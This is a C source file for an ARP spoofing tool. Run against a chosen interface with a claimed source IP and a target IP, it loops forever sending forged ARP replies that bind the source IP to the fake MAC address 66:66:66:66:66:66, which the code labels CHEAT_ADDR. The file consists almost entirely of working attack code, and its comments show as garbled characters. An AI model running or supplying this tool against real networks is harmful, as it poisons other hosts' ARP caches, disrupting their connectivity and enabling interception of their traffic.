#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <net/ethernet.h>
#include <net/if_arp.h>
#include <net/if.h>
#include <netpacket/packet.h>

/* ��̫��֡�ײ����� */
#define ETHER_HEADER_LEN sizeof(struct ether_header)
/* ����arp�ṹ���� */
#define ETHER_ARP_LEN sizeof(struct ether_arp)
/* ��̫�� + ����arp�ṹ���� */
#define ETHER_ARP_PACKET_LEN ETHER_HEADER_LEN + ETHER_ARP_LEN
/* IP��ַ���� */
#define IP_ADDR_LEN 4
/* �㲥��ַ */
#define BROADCAST_ADDR {0xff, 0xff, 0xff, 0xff, 0xff, 0xff}

#define CHEAT_ADDR {0x66, 0x66, 0x66, 0x66, 0x66, 0x66}


void err_exit(const char *err_msg)
{
    perror(err_msg);
    exit(1);
}

struct ether_arp *fill_arp_packet(const unsigned char *src_mac_addr, const char *src_ip, const char *dst_ip)
{
    struct ether_arp *arp_packet;
    struct in_addr src_in_addr, dst_in_addr;
    unsigned char dst_mac_addr[ETH_ALEN] = BROADCAST_ADDR;

    /* IP��ַת�� */
    inet_pton(AF_INET, src_ip, &src_in_addr);
    inet_pton(AF_INET, dst_ip, &dst_in_addr);

    /* ����arp�� */
    arp_packet = (struct ether_arp *)malloc(ETHER_ARP_LEN);
    arp_packet->arp_hrd = htons(ARPHRD_ETHER);
    arp_packet->arp_pro = htons(ETHERTYPE_IP);
    arp_packet->arp_hln = ETH_ALEN;
    arp_packet->arp_pln = IP_ADDR_LEN;
    arp_packet->arp_op = htons(ARPOP_REPLY);
    memcpy(arp_packet->arp_sha, src_mac_addr, ETH_ALEN);
    memcpy(arp_packet->arp_tha, dst_mac_addr, ETH_ALEN);
    memcpy(arp_packet->arp_spa, &src_in_addr, IP_ADDR_LEN);
    memcpy(arp_packet->arp_tpa, &dst_in_addr, IP_ADDR_LEN);

    return arp_packet;
}

/* arp���� */
void arp_request(const char *if_name,const char *sip ,const char *dst_ip)
{
    struct sockaddr_ll saddr_ll;
    struct ether_header *eth_header;
    struct ether_arp *arp_packet;
    struct ifreq ifr;
    char buf[ETHER_ARP_PACKET_LEN];
    unsigned char src_mac_addr[ETH_ALEN];
    unsigned char dst_mac_addr[ETH_ALEN] = BROADCAST_ADDR;
    char *src_ip;
    int sock_raw_fd, ret_len, i;
    
    unsigned char s_mac_addr[ETH_ALEN] = CHEAT_ADDR;

    if ((sock_raw_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1)
        err_exit("socket()");

    bzero(&saddr_ll, sizeof(struct sockaddr_ll));
    bzero(&ifr, sizeof(struct ifreq));
    /* �����ӿ��� */
    memcpy(ifr.ifr_name, if_name, strlen(if_name));

    /* ��ȡ�����ӿ����� */
    if (ioctl(sock_raw_fd, SIOCGIFINDEX, &ifr) == -1)
        err_exit("ioctl() get ifindex");
    saddr_ll.sll_ifindex = ifr.ifr_ifindex;
    saddr_ll.sll_family = PF_PACKET;
    saddr_ll.sll_protocol = htons(ETH_P_ALL);

    /* ��ȡ�����ӿ�IP */
    if (ioctl(sock_raw_fd, SIOCGIFADDR, &ifr) == -1)
        err_exit("ioctl() get ip");
    src_ip = inet_ntoa(((struct sockaddr_in *)&(ifr.ifr_addr))->sin_addr);
    printf("local ip:%s\n", src_ip);

    /* ��ȡ�����ӿ�MAC��ַ */
    if (ioctl(sock_raw_fd, SIOCGIFHWADDR, &ifr))
        err_exit("ioctl() get mac");
    //memcpy(src_mac_addr, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
    printf("local mac\n");
    for (i = 0; i < ETH_ALEN; i++)
        printf(":%02x", ifr.ifr_hwaddr.sa_data[i]);

    printf("cheat mac\n");
    for (i = 0; i < ETH_ALEN; i++)
        printf(":%02x", src_mac_addr[i]);
    printf("\n");

    bzero(buf, ETHER_ARP_PACKET_LEN);
    /* �����̫�ײ� */
    eth_header = (struct ether_header *)buf;
    memcpy(eth_header->ether_shost, s_mac_addr, ETH_ALEN); //ԭ
    memcpy(eth_header->ether_dhost, dst_mac_addr, ETH_ALEN);
    eth_header->ether_type = htons(ETHERTYPE_ARP);
    /* arp�� */
     //arp_packet = fill_arp_packet(CHEAT_ADDR, src_ip, dst_ip);
    arp_packet = fill_arp_packet(s_mac_addr, sip, dst_ip);
    memcpy(buf + ETHER_HEADER_LEN, arp_packet, ETHER_ARP_LEN);
	
    /* �������� */
	while(1)
	{  
		ret_len = sendto(sock_raw_fd, buf, ETHER_ARP_PACKET_LEN, 0, (struct sockaddr *)&saddr_ll, sizeof(struct sockaddr_ll));
		if ( ret_len > 0)
			printf("sendto() ok!!!\n");
		sleep(1);
	}

    close(sock_raw_fd);
}

int main(int argc, const char *argv[])
{
    if (argc != 4)
    {
        printf("usage:%s device_name src_ip dst_ip\n", argv[0]);
        exit(1);
    }

    arp_request(argv[1], argv[2], argv[3]);
    
    return 0;
}